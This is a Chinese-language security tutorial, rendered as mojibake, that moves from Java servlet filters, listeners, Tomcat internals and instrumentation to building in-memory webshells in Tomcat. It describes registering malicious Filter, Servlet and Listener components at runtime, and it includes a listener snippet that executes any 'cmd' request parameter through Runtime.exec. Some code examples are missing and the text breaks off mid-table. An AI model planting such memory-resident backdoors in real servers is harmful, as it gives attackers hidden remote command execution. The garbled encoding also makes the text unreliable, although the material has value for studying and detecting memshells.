æ–¹æ³•ä¸­ä¸èƒ½ç›´æ¥è°ƒç”¨ Servlet çš„ service æ–¹æ³•ï¼Œè€Œæ˜¯è°ƒç”¨ FilterChain.doFilter æ–¹æ³•æ¥æ¿€æ´»ç›®æ ‡ Servlet çš„ service æ–¹æ³•ï¼ŒFilterChain å¯¹è±¡æ—¶é€šè¿‡ Filter.doFilter æ–¹æ³•çš„å‚æ•°ä¼ é€’è¿›æ¥çš„ã€‚ 5ã€åªè¦åœ¨ Filter.doFilter æ–¹æ³•ä¸­è°ƒç”¨ FilterChain.doFilter æ–¹æ³•çš„è¯­å¥å‰åå¢åŠ æŸäº›ç¨‹åºä»£ç ï¼Œè¿™æ ·å°±å¯ä»¥åœ¨ Servlet è¿›è¡Œå“åº”å‰åå®ç°æŸäº›ç‰¹æ®ŠåŠŸèƒ½ã€‚ 6ã€å¦‚æœåœ¨ Filter.doFilter æ–¹æ³•ä¸­æ²¡æœ‰è°ƒç”¨ FilterChain.doFilter æ–¹æ³•ï¼Œåˆ™ç›®æ ‡ Servlet çš„ service æ–¹æ³•ä¸ä¼šè¢«æ‰§è¡Œï¼Œè¿™æ ·é€šè¿‡ Filter å°±å¯ä»¥é˜»æ­¢æŸäº›éæ³•çš„è®¿é—®è¯·æ±‚ã€‚ filterçš„ç”Ÿå‘½å‘¨æœŸ å½“æœåŠ¡å™¨å¯åŠ¨ï¼Œå°±ä¼šåˆ›å»ºFilterå¯¹è±¡ï¼ˆéšç€Tomcatçš„å¯åŠ¨è€Œåˆ›å»ºï¼‰ï¼Œå¹¶è°ƒç”¨init()æ–¹æ³•ï¼Œåªè°ƒç”¨ä¸€æ¬¡ å½“è®¿é—®èµ„æºæ—¶ï¼Œè·¯å¾„ä¸filteræ‹¦æˆªè·¯å¾„åŒ¹é…ï¼Œä¼šæ‰§è¡ŒFilterä¸­çš„doFilteræ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•æ˜¯çœŸæ­£æ‹¦æˆªæ“ä½œçš„æ–¹æ³•ã€‚ å½“æœåŠ¡å™¨å…³é—­æ—¶ï¼Œä¼šè°ƒç”¨Filterä¸­çš„destroyæ–¹æ³•æ¥è¿›è¡Œé”€æ¯æ“ä½œã€‚ filteré“¾ å½“å¤šä¸ªfilteråŒæ—¶å­˜åœ¨çš„æ—¶å€™ï¼Œç»„æˆäº†filteré“¾ã€‚ webæœåŠ¡å™¨æ ¹æ®Filteråœ¨web.xmlæ–‡ä»¶ä¸­çš„æ³¨å†Œé¡ºåºï¼Œå†³å®šå…ˆè°ƒç”¨å“ªä¸ªFilterã€‚å½“ç¬¬ä¸€ä¸ªFilterçš„doFilteræ–¹æ³•è¢«è°ƒç”¨æ—¶ï¼ŒwebæœåŠ¡å™¨ä¼šåˆ›å»ºä¸€ä¸ªä»£è¡¨Filteré“¾çš„FilterChainå¯¹è±¡ä¼ é€’ç»™è¯¥æ–¹æ³•ï¼Œé€šè¿‡åˆ¤æ–­FilterChainä¸­æ˜¯å¦è¿˜æœ‰filterå†³å®šåé¢æ˜¯å¦è¿˜è°ƒç”¨filterã€‚ ä»£ç ç¤ºä¾‹ Listener ç¨‹åºå¼€å‘ä¸­ï¼Œç»å¸¸éœ€è¦å¯¹æŸäº›äº‹ä»¶è¿›è¡Œç›‘å¬ï¼Œæ¯”å¦‚ç›‘å¬å®¢æˆ·ç«¯çš„è¯·æ±‚ã€æœåŠ¡ç«¯çš„æ“ä½œç­‰ã€‚é€šè¿‡ç›‘å¬å™¨ï¼Œå¯ä»¥è‡ªåŠ¨å‡ºå‘ä¸€äº›åŠ¨ä½œï¼Œæ¯”å¦‚ç›‘å¬åœ¨çº¿çš„ç”¨æˆ·æ•°é‡ï¼Œç»Ÿè®¡ç½‘ç«™è®¿é—®é‡ã€ç½‘ç«™è®¿é—®ç›‘æ§ç­‰ã€‚ äº‹ä»¶ï¼šç”¨æˆ·çš„ä¸€ä¸ªæ“ä½œï¼Œå¦‚ç‚¹å‡»æŒ‰é’® äº‹ä»¶æºï¼šäº§ç”Ÿäº‹ä»¶çš„å¯¹è±¡ã€‚ ç›‘å¬å™¨ï¼šè´Ÿè´£ç›‘å¬å‘ç”Ÿåœ¨äº‹ä»¶æºä¸Šçš„äº‹ä»¶ã€‚ æ³¨å†Œç›‘å¬ï¼šå°†äº‹ä»¶ï¼Œäº‹ä»¶æºï¼Œç›‘å¬å™¨ç»‘å®šåœ¨ä¸€èµ·ã€‚å½“äº‹ä»¶æºä¸Šå‘ç”ŸæŸä¸ªäº‹ä»¶åï¼Œæ‰§è¡Œç›‘å¬å™¨ä»£ç ã€‚ ä»£ç ç¤ºä¾‹ import javax.servlet.ServletContextEvent; import javax.servlet.ServletContextListener; import javax.servlet.annotation.WebListener; import javax.servlet.http.HttpSessionAttributeListener; import javax.servlet.http.HttpSessionEvent; import javax.servlet.http.HttpSessionListener; import javax.servlet.http.HttpSessionBindingEvent; @WebListener() public class HelloListener implements ServletContextListener, HttpSessionListener, HttpSessionAttributeListener { // Public constructor is required by servlet spec public HelloListener() { } // ------------------------------------------------------- // ServletContextListener implementation // ------------------------------------------------------- public void contextInitialized(ServletContextEvent sce) { // åˆå§‹åŒ–èµ„æºï¼Œä¾‹å¦‚æ‰“å¼€æ•°æ®åº“è¿æ¥æ± ç­‰: /* This method is called when the servlet context is initialized(when the Web application is deployed). You can initialize servlet context related data here. */ } public void contextDestroyed(ServletContextEvent sce) { // æ¸…ç†WebApp,ä¾‹å¦‚å…³é—­æ•°æ®åº“è¿æ¥æ± ç­‰ /* This method is invoked when the Servlet Context (the Web application) is undeployed or Application Server shuts down. */ } // ------------------------------------------------------- // HttpSessionListener implementation // ------------------------------------------------------- public void sessionCreated(HttpSessionEvent se) { /* Session is created. */ } public void sessionDestroyed(HttpSessionEvent se) { /* Session is destroyed. */ } // ------------------------------------------------------- // HttpSessionAttributeListener implementation // ------------------------------------------------------- public void attributeAdded(HttpSessionBindingEvent sbe) { /* This method is called when an attribute is added to a session. */ } public void attributeRemoved(HttpSessionBindingEvent sbe) { /* This method is called when an attribute is removed from a session. */ } public void attributeReplaced(HttpSessionBindingEvent sbe) { /* This method is invoked when an attribute is replaced in a session. */ } } Tomcat ç®€å•ç†è§£ï¼Œtomcatæ˜¯httpæœåŠ¡å™¨+servletå®¹å™¨ã€‚ Tomcat ä½œä¸ºServletå®¹å™¨,å°†httpè¯·æ±‚æ–‡æœ¬æ¥æ”¶å¹¶è§£æï¼Œç„¶åå°è£…æˆHttpServletRequestç±»å‹çš„requestå¯¹è±¡ï¼Œä¼ é€’ç»™servletï¼›åŒæ—¶ä¼šå°†å“åº”çš„ä¿¡æ¯å°è£…ä¸ºHttpServletResponseç±»å‹çš„responseå¯¹è±¡ï¼Œç„¶åå°†responseäº¤ç»™tomcatï¼Œtomcatå°±ä¼šå°†å…¶å˜æˆå“åº”æ–‡æœ¬çš„æ ¼å¼å‘é€ç»™æµè§ˆå™¨ã€‚ Tomcatæ¶æ„è®¾è®¡ Tomcat çš„æœ¬è´¨å…¶å®å°±æ˜¯ä¸€ä¸ª WEB æœåŠ¡å™¨ + ä¸€ä¸ª Servlet å®¹å™¨ï¼Œé‚£ä¹ˆå®ƒå¿…ç„¶éœ€è¦å¤„ç†ç½‘ç»œçš„è¿æ¥ä¸ Servlet çš„ç®¡ç†ï¼Œå› æ­¤ï¼ŒTomcat è®¾è®¡äº†ä¸¤ä¸ªæ ¸å¿ƒç»„ä»¶æ¥å®ç°è¿™ä¸¤ä¸ªåŠŸèƒ½ï¼Œåˆ†åˆ«æ˜¯è¿æ¥å™¨å’Œå®¹å™¨ï¼Œè¿æ¥å™¨ç”¨æ¥å¤„ç†å¤–éƒ¨ç½‘ç»œè¿æ¥ï¼Œå®¹å™¨ç”¨æ¥å¤„ç†å†…éƒ¨ Servlet ä¸€ä¸ª Tomcat ä»£è¡¨ä¸€ä¸ª Server æœåŠ¡å™¨ï¼Œä¸€ä¸ª Server æœåŠ¡å™¨å¯ä»¥åŒ…å«å¤šä¸ª Service æœåŠ¡ï¼ŒTomcat é»˜è®¤çš„ Service æœåŠ¡æ˜¯ Catalinaï¼Œè€Œä¸€ä¸ª Service æœåŠ¡å¯ä»¥åŒ…å«å¤šä¸ªè¿æ¥å™¨ï¼Œå› ä¸º Tomcat æ”¯æŒå¤šç§ç½‘ç»œåè®®ï¼ŒåŒ…æ‹¬ HTTP/1.1ã€HTTP/2ã€AJP ç­‰ç­‰ï¼Œä¸€ä¸ª Service æœåŠ¡è¿˜ä¼šåŒ…æ‹¬ä¸€ä¸ªå®¹å™¨ï¼Œå®¹å™¨å¤–éƒ¨ä¼šæœ‰ä¸€å±‚ Engine å¼•æ“æ‰€åŒ…è£¹ï¼Œè´Ÿè´£ä¸å¤„ç†è¿æ¥å™¨çš„è¯·æ±‚ä¸å“åº”ï¼Œè¿æ¥å™¨ä¸å®¹å™¨ä¹‹é—´é€šè¿‡ ServletRequest å’Œ ServletResponse å¯¹è±¡è¿›è¡Œäº¤æµã€‚ åœ¨Containerå®¹å™¨ä¸­åŒ…å«4ä¸ªå­å®¹å™¨ï¼Œä¸”å­˜åœ¨åŒ…å«å…³ç³»ï¼Œåˆ†åˆ«æ˜¯ï¼š å®¹å™¨ å®ç°ç±» å«ä¹‰ Engine org.apache.catalina.core.StandardEngine æœ€é¡¶å±‚å®¹å™¨ç»„ä»¶ï¼Œå¯ä»¥åŒ…å«å¤šä¸ªHost Host org.apache.catalina.core.StandardHost ä¸€ä¸ªHostä»£è¡¨ä¸€ä¸ªè™šæ‹Ÿä¸»æœºï¼Œå¦‚a.comã€b.comï¼Œå…¶ä¸‹å¯ä»¥æœ‰å¤šä¸ªContext Context org.apache.catalina.core.StandardContext ä¸€ä¸ªContextä»£è¡¨ä¸€ä¸ªWebåº”ç”¨ï¼Œå¦‚/exampleã€/ROOTã€/managerï¼Œå…¶ä¸‹å¯æœ‰å¤šä¸ªWrapper Wrapper org.apache.catalina.core.StandardWrapper ä¸€ä¸ªWrapperé€šå¸¸ä»£è¡¨ä¸€ä¸ªServletï¼Œæ˜¯å¯¹Servletçš„å°è£… ä¸€ä¸ªengineå¯ä»¥å¯¹ä¸€ä¸ªå¤šä¸ªhostï¼Œä¹Ÿå°±æ˜¯è™šæ‹Ÿä¸»æœºï¼Œä¸€ä¸ªhostå¯ä»¥å¯¹åº”å¤šä¸ªcontextï¼Œä¹Ÿå°±æ˜¯webåº”ç”¨ï¼Œä¸€ä¸ªcontextå¯¹åº”å¤šä¸ªwrapperï¼Œä¹Ÿå°±æ˜¯servletã€‚è¿™ä¸ªæ˜ å°„å…³ç³»ï¼Œé€šè¿‡mapperç»„ä»¶æ¥å…³è”ï¼Œmapperç»„ä»¶ä¿å­˜äº†Webåº”ç”¨çš„é…ç½®ä¿¡æ¯ï¼Œå®¹å™¨ç»„ä»¶ä¸è®¿é—®è·¯å¾„çš„æ˜ å°„å…³ç³»ã€‚Hostå®¹å™¨çš„åŸŸåï¼ŒContextå®¹å™¨ä¸­çš„webè·¯å¾„ï¼ŒWrapperå®¹å™¨ä¸­çš„servletæ˜ å°„çš„è·¯å¾„ï¼Œè¿™äº›é…ç½®ä¿¡æ¯æ˜¯å¤šå±‚æ¬¡çš„Mapã€‚æ ¹æ®è¯·æ±‚å®šä½åˆ°æŒ‡å®šservletçš„æµç¨‹å›¾å¦‚ä¸‹ï¼š å…¶ä»–çŸ¥è¯† åå°„ åå°„æä¾›çš„åŠŸèƒ½ï¼Œèƒ½åœ¨è¿è¡Œæ—¶ï¼ˆåŠ¨æ€ï¼‰çš„ è·å–ä¸€ä¸ªç±»çš„æ‰€æœ‰æˆå‘˜å˜é‡å’Œæ–¹æ³• åˆ›å»ºä¸€ä¸ªç±»çš„å¯¹è±¡ a. è·å–å¯¹è±¡æˆå‘˜å˜é‡&èµ‹å€¼ b. è°ƒç”¨å¯¹è±¡çš„æ–¹æ³• c. åˆ¤æ–­å¯¹è±¡æ‰€å±çš„ç±» åœ¨æ³¨å…¥å†…å­˜é©¬çš„è¿‡ç¨‹å½“ä¸­ï¼Œæˆ‘ä»¬å¯èƒ½éœ€è¦ç”¨åˆ°åå°„æœºåˆ¶ï¼Œä¾‹å¦‚æ³¨å…¥ä¸€ä¸ªservletå‹çš„å†…å­˜é©¬ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨åå°„æœºåˆ¶æ¥è·å–å½“å‰çš„contextï¼Œç„¶åå°†æ¶æ„çš„servletï¼ˆwrapperï¼‰æ·»åŠ åˆ°å½“å‰çš„contextçš„childrenä¸­ã€‚ åœ¨ä½¿ç”¨Javaåå°„æœºåˆ¶æ—¶ï¼Œä¸»è¦æ­¥éª¤åŒ…æ‹¬ï¼š è·å–ç›®æ ‡ç±»å‹çš„Classå¯¹è±¡ é€šè¿‡Classå¯¹è±¡åˆ†åˆ«è·å–Constructorç±»å¯¹è±¡ã€Methodç±»å¯¹è±¡å’ŒFieldç±»å¯¹è±¡ é€šè¿‡Constructorç±»å¯¹è±¡ã€Methodç±»å¯¹è±¡å’ŒFieldç±»å¯¹è±¡åˆ†åˆ«è·å–ç±»çš„æ„é€ å‡½æ•°ã€æ–¹æ³•&å±æ€§çš„å…·ä½“ä¿¡æ¯ï¼Œå¹¶è¿›è¡Œåç»­æ“ä½œ java instrumentation Java Intrumentation å’Œç›¸å…³åº”ç”¨ åŠ¨æ€ Instrumentation æ˜¯ Java SE 5 çš„æ–°ç‰¹æ€§ï¼Œå®ƒåœ¨ java.lang.instrument åŒ…ä¸­ï¼Œå®ƒæŠŠ Java çš„ instrument åŠŸèƒ½ä»æœ¬åœ°ä»£ç ä¸­é‡Šæ”¾å‡ºæ¥ï¼Œä½¿å…¶å¯ä»¥ç”¨ Java ä»£ç çš„æ–¹å¼è§£å†³é—®é¢˜ã€‚ä½¿ç”¨ Instrumentationï¼Œå¼€å‘è€…å¯ä»¥æ„å»ºä¸€ä¸ªç‹¬ç«‹äºåº”ç”¨ç¨‹åºçš„ä»£ç†ç¨‹åºï¼ˆAgentï¼‰ï¼Œç”¨æ¥ç›‘æµ‹å’ŒååŠ©è¿è¡Œåœ¨ JVM ä¸Šçš„ç¨‹åºï¼Œç”šè‡³å¯ä»¥æ›¿æ¢å’Œä¿®æ”¹æŸäº›ç±»çš„å®šä¹‰ã€‚æœ‰äº†è¿™æ ·çš„åŠŸèƒ½ï¼Œå¼€å‘è€…å°±å¯ä»¥å®ç°æ›´ä¸ºçµæ´»çš„è™šæ‹Ÿæœºç›‘æ§å’Œ Javaçš„ç±»æ“ä½œäº†ï¼Œè¿™æ ·çš„ç‰¹æ€§å®é™…ä¸Šæä¾›äº†ä¸€ç§è™šæ‹Ÿæœºçº§åˆ«æ”¯æŒçš„ AOPæ–¹å¼ï¼Œä½¿å¾—å¼€å‘è€…æ— éœ€å¯¹åŸæœ‰åº”ç”¨åšä»»ä½•ä¿®æ”¹ï¼Œå°±å¯ä»¥å®ç°ç±»çš„åŠ¨æ€ä¿®æ”¹å’Œå¢å¼º java.lang.instrument åŒ…è¢«èµ‹äºˆäº†æ›´å¼ºå¤§çš„åŠŸèƒ½ï¼šå¯åŠ¨åçš„ ç›‘æµ‹ã€æœ¬åœ°ä»£ç ï¼ˆnative codeï¼‰ç›‘æµ‹ï¼Œä»¥åŠåŠ¨æ€æ”¹å˜ classpath ç­‰ç­‰ã€‚è¿™äº›æ”¹å˜ï¼Œæ„å‘³ç€ Java å…·æœ‰äº†æ›´å¼ºçš„åŠ¨æ€æ§åˆ¶ä¸è§£é‡Šèƒ½åŠ›ï¼Œå®ƒä½¿å¾— Java è¯­è¨€å˜å¾—æ›´åŠ çµæ´»å¤šå˜ã€‚ Java agentæ˜¯ä¸€ç§ç‰¹æ®Šçš„Javaç¨‹åºï¼ˆJaræ–‡ä»¶ï¼‰ï¼Œå®ƒæ˜¯Instrumentationçš„å®¢æˆ·ç«¯ã€‚ä¸æ™®é€šJavaç¨‹åºé€šè¿‡mainæ–¹æ³•å¯åŠ¨ä¸åŒï¼Œagentå¹¶ä¸æ˜¯ä¸€ä¸ªå¯ä»¥å•ç‹¬å¯åŠ¨çš„ç¨‹åºï¼Œè€Œå¿…é¡»ä¾é™„åœ¨ä¸€ä¸ªJavaåº”ç”¨ç¨‹åºï¼ˆJVMï¼‰ä¸Šï¼Œä¸å®ƒè¿è¡Œåœ¨åŒä¸€ä¸ªè¿›ç¨‹ä¸­ï¼Œé€šè¿‡Instrumentation APIä¸è™šæ‹Ÿæœºäº¤äº’ã€‚ åœ¨æ³¨å…¥å†…å­˜é©¬çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨java instrumentationæœºåˆ¶ï¼ŒåŠ¨æ€çš„ä¿®æ”¹å·²åŠ è½½åˆ°å†…å­˜ä¸­çš„ç±»é‡Œçš„æ–¹æ³•ï¼Œè¿›è€Œæ³¨å…¥æ¶æ„çš„ä»£ç ã€‚ servlet-apiå†…å­˜é©¬ç¼–å†™ æ‰€æœ‰å†…å­˜é©¬ç¼–å†™æ—¶ï¼Œéƒ½å¯ä»¥è‡ªå·±å†™ä¸€ä¸ªå¯¹åº”çš„ä¸œè¥¿ï¼Œæ¯”å¦‚filterã€servletï¼Œç„¶åå»è·Ÿä¸€ä¸‹Tomcatæœ¬èº«æ˜¯å¦‚ä½•å»æ·»åŠ è¿™äº›ä¸œè¥¿çš„ï¼Œæœ€åæ¨¡æ‹Ÿä¸€ä¸‹è¿™ä¸ªè¿‡ç¨‹åŠ¨æ€æ·»åŠ å°±è¡Œäº† Filterå†…å­˜é©¬ Filter å†…å­˜é©¬æ˜¯é€šè¿‡åŠ¨æ€æ³¨å†Œä»¥ä¸€ä¸ªæ¶æ„Filterï¼Œç”±äºæ˜¯åŠ¨æ€æ³¨å†Œçš„ï¼Œæ‰€ä»¥è¿™ä¸ªfilteræ²¡æœ‰æ–‡ä»¶å®ä½“ï¼Œå­˜åœ¨å†…å­˜ä¸­ï¼Œå½“tomcaté‡å¯å°±æ¶ˆå¤±äº† ä¸€èˆ¬æˆ‘ä»¬æŠŠè¿™ä¸ªFilteræ”¾åœ¨æ‰€æœ‰çš„filteræœ€å‰é¢ä¼˜å…ˆæ‰§è¡Œï¼Œä¹Ÿå°±æ˜¯filteré“¾çš„ç¬¬ä¸€ä¸ªï¼Œè¿™æ ·æˆ‘ä»¬çš„è¯·æ±‚å°±ä¸ä¼šå—åˆ°å…¶ä»–filterçš„å¹²æ‰° éœ€è¦åŠ¨æ€æ³¨å†Œfilterå°±éœ€è¦æ·»åŠ filterç›¸å…³çš„åº“ã€å‡½æ•°ç­‰ ServletContext éœ€è¦åŠ¨æ€æ³¨å†Œfilterå°±éœ€è¦å‡ ä¸ªæ·»åŠ filterç›¸å…³çš„å‡½æ•°ï¼ŒServletContextæ°å¥½å¯ä»¥æ»¡è¶³è¿™ä¸ªæ¡ä»¶ javax.servlet.servletContextä¸­å­˜åœ¨addFilterï¼ŒaddServletï¼ŒaddListeneræ–¹æ³•ï¼Œå³æ·»åŠ Filterï¼ŒServletï¼ŒListener è·å–ServletContextçš„æ–¹æ³•ï¼šthis.getServletContext();ã€this.getServletConfig().getServletContext(); ApplicationContext åœ¨Tomcatä¸­ï¼Œorg.apache.catalina.core.ApplicationContextä¸­åŒ…å«ä¸€ä¸ªServletContextæ¥å£çš„å®ç°ï¼Œæ‰€ä»¥éœ€è¦å¼•å…¥org.apache.catalina.core.ApplicationContextè¿™ä¸ªåº“ï¼Œç”¨å®ƒè·å–ä¸Šä¸‹æ–‡StandardContext Filterç›¸å…³å˜é‡ åç§° è¯´æ˜ filterMaps å˜é‡ å­˜æ”¾FilterMapçš„æ•°ç»„ï¼Œåœ¨ FilterMap ä¸­ä¸»è¦å­˜æ”¾äº† FilterName å’Œ å¯¹åº”çš„URLPattern filterDefs å˜é‡ å­˜æ”¾FilterDefçš„æ•°ç»„ ï¼ŒFilterDef ä¸­å­˜å‚¨ç€æˆ‘ä»¬è¿‡æ»¤å™¨åï¼Œè¿‡æ»¤å™¨å®ä¾‹ç­‰åŸºæœ¬ä¿¡æ¯ filterConfigs å˜é‡ å­˜æ”¾filterConfigçš„æ•°ç»„ï¼Œåœ¨ FilterConfig ä¸­ä¸»è¦å­˜æ”¾ FilterDef å’Œ Filterå¯¹è±¡ç­‰ä¿¡æ¯ FilterChain å˜é‡ è¿‡æ»¤å™¨é“¾ï¼Œè¯¥å¯¹è±¡ä¸Šçš„ doFilter æ–¹æ³•èƒ½ä¾æ¬¡è°ƒç”¨é“¾ä¸Šçš„ Filter ApplicationFilterChain è°ƒç”¨è¿‡æ»¤å™¨é“¾ ApplicationFilterConfig è·å–è¿‡æ»¤å™¨ ApplicationFilterFactory ç»„è£…è¿‡æ»¤å™¨é“¾ StandardContext Contextæ¥å£çš„æ ‡å‡†å®ç°ç±»ï¼Œä¸€ä¸ª Context ä»£è¡¨ä¸€ä¸ª Web åº”ç”¨ï¼Œå…¶ä¸‹å¯ä»¥åŒ…å«å¤šä¸ª Wrapper** StandardWrapperValve ä¸€ä¸ª Wrapper çš„æ ‡å‡†å®ç°ç±»ï¼Œä¸€ä¸ª Wrapper ä»£è¡¨ä¸€ä¸ªServlet org.apache.catalina.core.ApplicationFilterConfig åœ¨tomcatä¸åŒç‰ˆæœ¬éœ€è¦é€šè¿‡ä¸åŒçš„åº“å¼•å…¥FilterMapå’ŒFilterDef // tomcat 7 import org.apache.catalina.deploy.FilterMap; import org.apache.catalina.deploy.FilterDef; // tomcat 8/9 import org.apache.tomcat.util.descriptor.web.FilterMap; import org.apache.tomcat.util.descriptor.web.FilterDef; åŠ¨æ€æ³¨å…¥å†…å­˜ éœ€è¦è°ƒè¯•çš„è¯ï¼Œç›´æ¥ç»™æƒ³è¦è°ƒè¯•çš„ä»£ç å†™åˆ°servleté‡Œé¢å°±å¯ä»¥è°ƒè¯•äº†ï¼Œé¿å…å»å°è¯•è°ƒè¯•JSP æµç¨‹ï¼š åˆ›å»ºä¸€ä¸ªæ¶æ„Filter åˆ©ç”¨FilterDefå¯¹Filterè¿›è¡Œä¸€ä¸ªå°è£… å°†FilterDefæ·»åŠ åˆ°FilterDefså’ŒFilterConfig åˆ›å»ºFilterMap ï¼Œå°†æˆ‘ä»¬çš„Filterå’Œurlpatternç›¸å¯¹åº”ï¼Œå­˜æ”¾åˆ°filterMapsä¸­ï¼ˆç”±äºFilterç”Ÿæ•ˆä¼šæœ‰ä¸€ä¸ªå…ˆåé¡ºåºï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸€èˆ¬éƒ½æ˜¯æ”¾åœ¨æœ€å‰é¢ï¼Œè®©æˆ‘ä»¬çš„Filteræœ€å…ˆè§¦å‘ï¼‰ Tomcatä¸­çš„å¯¹åº”çš„ServletContextå®ç°æ˜¯ApplicationContextï¼Œåœ¨Webåº”ç”¨ä¸­è·å–çš„ServletContextå®é™…ä¸Šæ˜¯ApplicationContextFacadeå¯¹è±¡ï¼Œå¯¹ApplicationContextè¿›è¡Œäº†å°è£…ï¼Œè€ŒApplicationContextå®ä¾‹ä¸­åˆåŒ…å«äº†StandardContextå®ä¾‹ï¼Œä»¥æ­¤æ¥è·å–æ“ä½œTomcatå®¹å™¨å†…éƒ¨çš„ä¸€äº›ä¿¡æ¯ï¼Œä¾‹å¦‚Servletçš„æ³¨å†Œç­‰ã€‚ å½“æˆ‘ä»¬èƒ½ç›´æ¥è·å– request çš„æ—¶å€™ï¼Œå¯ä»¥ç›´æ¥å°† ServletContext è½¬ä¸º StandardContext ä»è€Œè·å– contextã€‚ Servletå†…å­˜é©¬ å¯åŠ¨ å¸¸è§„æƒ…å†µä¸‹åœ¨å¯åŠ¨æ—¶ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨StandardContext.addServletMappingDecoded()æ–¹æ³•ç»™æˆ‘ä»¬å®šä¹‰çš„è·¯ç”±å’Œåå­—åŠ è¿›å»ï¼Œæ‰€æœ‰åé¢åŠ¨æ€æ³¨å…¥ä¹Ÿæ˜¯åˆ©ç”¨çš„è¿™ä¸ªæ–¹æ³•ï¼Œè·å–åˆ°StandardContextç„¶åæ·»åŠ å³å¯ï¼Œå‰ææ˜¯è¦ç»™è¿™ä¸ªservletå…ˆæ·»åŠ åˆ°childrenä¸­ servletMappingså’Œå‰æåˆ¤æ–­æ¡ä»¶ findChild() addChild() ä¼šç»™æˆ‘ä»¬åˆ›å»ºçš„servlet/wrapperæ·»åŠ åˆ°childrenä¸­ åŠ¨æ€æ³¨å…¥å†…å­˜ ä¸‹é¢çš„ä»£ç å…ˆæ˜¯åˆ›å»ºäº†ä¸€ä¸ªæ¶æ„çš„servletï¼Œç„¶åè·å–å½“å‰çš„StandardContextï¼Œç„¶åå°†æ¶æ„servletå°è£…æˆwrapperæ·»åŠ åˆ°StandardContextçš„childrenå½“ä¸­ï¼Œæœ€åæ·»åŠ ServletMappingå°†è®¿é—®çš„URLå’Œwrapperè¿›è¡Œç»‘å®šã€‚ æ‰§è¡Œä¸Šè¿°ä»£ç åï¼Œè®¿é—®å½“å‰åº”ç”¨çš„/shellè·¯å¾„ï¼ŒåŠ ä¸Šcmdå‚æ•°å°±å¯ä»¥å‘½ä»¤æ‰§è¡Œäº†ã€‚ä½¿ç”¨æ–°å¢servletçš„æ–¹å¼å°±éœ€è¦ç»‘å®šæŒ‡å®šçš„URLã€‚å¦‚æœæˆ‘ä»¬æƒ³è¦æ›´åŠ éšè”½ï¼Œåšåˆ°å†…å­˜é©¬ä¸URLæ— å…³ï¼Œæ— è®ºè¿™ä¸ªurlæ˜¯åŸç”Ÿservletè¿˜æ˜¯æŸä¸ªstruts actionï¼Œç”šè‡³æ— è®ºè¿™ä¸ªurlæ˜¯å¦çœŸçš„å­˜åœ¨ï¼Œåªè¦æˆ‘ä»¬çš„è¯·æ±‚ä¼ é€’ç»™tomcatï¼Œtomcatå°±èƒ½ç›¸åº”æˆ‘ä»¬çš„æŒ‡ä»¤ï¼Œé‚£å°±å¾—é€šè¿‡æ³¨å…¥æ–°çš„æˆ–ä¿®æ”¹å·²æœ‰çš„filteræˆ–è€…listenerçš„æ–¹å¼æ¥å®ç°äº†ã€‚ æ¯”å¦‚æ—©æœŸrebeyondå¸ˆå‚…å¼€å‘çš„memshellï¼Œå°±æ˜¯é€šè¿‡ä¿®æ”¹org.apache.catalina.core.ApplicationFilterChainç±»çš„internalDoFilteræ–¹æ³•æ¥å®ç°çš„ï¼ŒåæœŸå†°èæœ€æ–°ç‰ˆæœ¬çš„å†…å­˜é©¬ä¸ºäº†å®ç°æ›´å¥½çš„å…¼å®¹æ€§ï¼Œé€‰æ‹©hook javax.servlet.http.HttpServlet#service å‡½æ•°ï¼Œåœ¨weblogicé€‰æ‹©hook weblogic.servlet.internal.ServletStubImpl#execute å‡½æ•°ã€‚ Listenerå†…å­˜é©¬ Listenerçš„ç›‘å¬ä¸»è¦åˆ†ä¸ºä¸‰ç±»ï¼š ServletContextç›‘å¬ï¼šç”¨äºå¯¹Servletæ•´ä¸ªä¸Šä¸‹æ–‡è¿›è¡Œç›‘å¬ï¼ˆåˆ›å»ºã€é”€æ¯ï¼‰ Sessionç›‘å¬ï¼šå¯¹Sessionçš„æ•´ä½“çŠ¶æ€çš„ç›‘å¬ Requestç›‘å¬ï¼šç”¨äºå¯¹Requestè¯·æ±‚è¿›è¡Œç›‘å¬ï¼ˆåˆ›å»ºã€é”€æ¯ï¼‰ å¯¹äºè¿™ä¸‰ç±»ï¼Œç†Ÿæ‚‰javaå’ŒTomcatçš„åŒå­¦åº”è¯¥çŸ¥é“ï¼Œå¯¹äºrequestçš„è¯·æ±‚å’Œç¯¡æ”¹æ˜¯å¸¸è§çš„åˆ©ç”¨æ–¹å¼ï¼Œå¦ä¸¤è€…æ¶‰åŠåˆ°æœåŠ¡å™¨çš„å¯åŠ¨è·Ÿåœæ­¢ï¼Œæˆ–è€…æ˜¯Sessionçš„å»ºç«‹è·Ÿé”€æ¯ï¼Œå°±ä¸å¤ªé€‚åˆ ServletRequestListeneræ¥å£ è¯¥æ¥å£å®ç°çš„æ–¹æ³•æœ‰requestDestroyedï¼ŒrequestInitializedï¼Œåˆ†åˆ«æ˜¯åœ¨ç›‘å¬requestè¯·æ±‚ç»“æŸï¼Œä»¥åŠrequestè¯·æ±‚å¼€å§‹ï¼Œæˆ‘ä»¬ç€é‡çœ‹è¯·æ±‚å¼€å§‹çš„éƒ¨åˆ† åœ¨requestInitializedè¿™ä¸ªå‡½æ•°ä¸­ï¼Œæˆ‘ä»¬ä»servletRequestEventå‚æ•°ä¸­å–cmdå‚æ•°ï¼Œåœ¨å½“å‰ä¸Šä¸‹æ–‡åªè¦åœ¨ä»»æ„è·¯ç”±ä¸‹ç›‘å¬åˆ°äº†cmdå‚æ•°å­˜åœ¨å€¼ï¼Œé‚£ä¹ˆå°±æ‰§è¡Œå‘½ä»¤ï¼Œå…·ä½“æ“ä½œå¦‚ä¸‹ public void requestInitialized(ServletRequestEvent servletRequestEvent) { String cmd = servletRequestEvent.getServletRequest().getParameter(\"cmd\"); if(cmd != null){ try { Runtime.getRuntime().exec(cmd); } catch (IOException e) {} } } è¿™é‡Œæ˜¯æ²¡æœ‰å›æ˜¾çš„ï¼Œç›²çš„ åŠ¨æ€æ³¨å…¥å†…å­˜ servlet-apiæ€»ç»“ ä»¥ä¸Šä¸‰ç§æ ¹æ®Servletçš„ç‰¹æ€§ï¼ŒåŠ¨æ€æ³¨å…¥ï¼Œjspæ–‡ä»¶åªè¦è½åœ°ï¼Œå³å¯åŠ¨æ€åŠ è½½åˆ°å†…å­˜ä¸­ å§¿åŠ¿ ä¼˜ç‚¹ ç¼ºç‚¹ 